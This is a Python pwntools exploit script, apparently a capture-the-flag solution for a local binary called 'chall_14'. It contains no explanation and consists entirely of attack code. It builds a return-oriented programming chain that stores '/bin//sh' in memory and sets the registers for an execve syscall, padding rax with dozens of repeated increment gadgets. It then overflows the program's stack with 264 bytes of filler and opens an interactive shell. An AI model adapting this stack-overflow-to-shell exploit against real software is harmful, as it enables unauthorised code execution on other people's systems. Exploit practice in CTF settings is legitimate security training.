from pwn import *
from struct import pack

# Padding goes here
var = b''

var += p64(0x000000000040f3fe) # pop rsi ; ret
var += p64(0x00000000004c00e0) # @ .data
var += p64(0x00000000004494a7) # pop rax ; ret
var += b'/bin//sh'
var += p64(0x000000000047b9c5) # mov qword ptr [rsi], rax ; ret
var += p64(0x000000000040f3fe) # pop rsi ; ret
var += p64(0x00000000004c00e8) # @ .data + 8
var += p64(0x0000000000443b00) # xor rax, rax ; ret
var += p64(0x000000000047b9c5) # mov qword ptr [rsi], rax ; ret
var += p64(0x00000000004018ca) # pop rdi ; ret
var += p64(0x00000000004c00e0) # @ .data
var += p64(0x000000000040f3fe) # pop rsi ; ret
var += p64(0x00000000004c00e8) # @ .data + 8
var += p64(0x00000000004017cf) # pop rdx ; ret
var += p64(0x00000000004c00e8) # @ .data + 8
var += p64(0x0000000000443b00) # xor rax, rax ; ret
var += p64(0x00000000004709f0) # add rax, 1 ; ret
var += p64(0x00000000004709f0) # add rax, 1 ; ret
var += p64(0x00000000004709f0) # add rax, 1 ; ret
var += p64(0x00000000004709f0) # add rax, 1 ; ret
var += p64(0x00000000004709f0) # add rax, 1 ; ret
var += p64(0x00000000004709f0) # add rax, 1 ; ret
var += p64(0x00000000004709f0) # add rax, 1 ; ret
var += p64(0x00000000004709f0) # add rax, 1 ; ret
var += p64(0x00000000004709f0) # add rax, 1 ; ret
var += p64(0x00000000004709f0) # add rax, 1 ; ret
var += p64(0x00000000004709f0) # add rax, 1 ; ret
var += p64(0x00000000004709f0) # add rax, 1 ; ret
var += p64(0x00000000004709f0) # add rax, 1 ; ret
var += p64(0x00000000004709f0) # add rax, 1 ; ret
var += p64(0x00000000004709f0) # add rax, 1 ; ret
var += p64(0x00000000004709f0) # add rax, 1 ; ret
var += p64(0x00000000004709f0) # add rax, 1 ; ret
var += p64(0x00000000004709f0) # add rax, 1 ; ret
var += p64(0x00000000004709f0) # add rax, 1 ; ret
var += p64(0x00000000004709f0) # add rax, 1 ; ret
var += p64(0x00000000004709f0) # add rax, 1 ; ret
var += p64(0x00000000004709f0) # add rax, 1 ; ret
var += p64(0x00000000004709f0) # add rax, 1 ; ret
var += p64(0x00000000004709f0) # add rax, 1 ; ret
var += p64(0x00000000004709f0) # add rax, 1 ; ret
var += p64(0x00000000004709f0) # add rax, 1 ; ret
var += p64(0x00000000004709f0) # add rax, 1 ; ret
var += p64(0x00000000004709f0) # add rax, 1 ; ret
var += p64(0x00000000004709f0) # add rax, 1 ; ret
var += p64(0x00000000004709f0) # add rax, 1 ; ret
var += p64(0x00000000004709f0) # add rax, 1 ; ret
var += p64(0x00000000004709f0) # add rax, 1 ; ret
var += p64(0x00000000004709f0) # add rax, 1 ; ret
var += p64(0x00000000004709f0) # add rax, 1 ; ret
var += p64(0x00000000004709f0) # add rax, 1 ; ret
var += p64(0x00000000004709f0) # add rax, 1 ; ret
var += p64(0x00000000004709f0) # add rax, 1 ; ret
var += p64(0x00000000004709f0) # add rax, 1 ; ret
var += p64(0x00000000004709f0) # add rax, 1 ; ret
var += p64(0x00000000004709f0) # add rax, 1 ; ret
var += p64(0x00000000004709f0) # add rax, 1 ; ret
var += p64(0x00000000004709f0) # add rax, 1 ; ret
var += p64(0x00000000004709f0) # add rax, 1 ; ret
var += p64(0x00000000004709f0) # add rax, 1 ; ret
var += p64(0x00000000004709f0) # add rax, 1 ; ret
var += p64(0x00000000004709f0) # add rax, 1 ; ret
var += p64(0x00000000004709f0) # add rax, 1 ; ret
var += p64(0x00000000004709f0) # add rax, 1 ; ret
var += p64(0x00000000004709f0) # add rax, 1 ; ret
var += p64(0x00000000004709f0) # add rax, 1 ; ret
var += p64(0x00000000004709f0) # add rax, 1 ; ret
var += p64(0x00000000004709f0) # add rax, 1 ; ret
var += p64(0x00000000004709f0) # add rax, 1 ; ret
var += p64(0x00000000004709f0) # add rax, 1 ; ret
var += p64(0x00000000004709f0) # add rax, 1 ; ret
var += p64(0x00000000004709f0) # add rax, 1 ; ret
var += p64(0x00000000004709f0) # add rax, 1 ; ret
var += p64(0x00000000004709f0) # add rax, 1 ; ret
var += p64(0x00000000004709f0) # add rax, 1 ; ret
var += p64(0x00000000004012d3) # syscall

p = process('./chall_14')

payload = b's'*264+var

p.sendline(payload)

p.interactive()
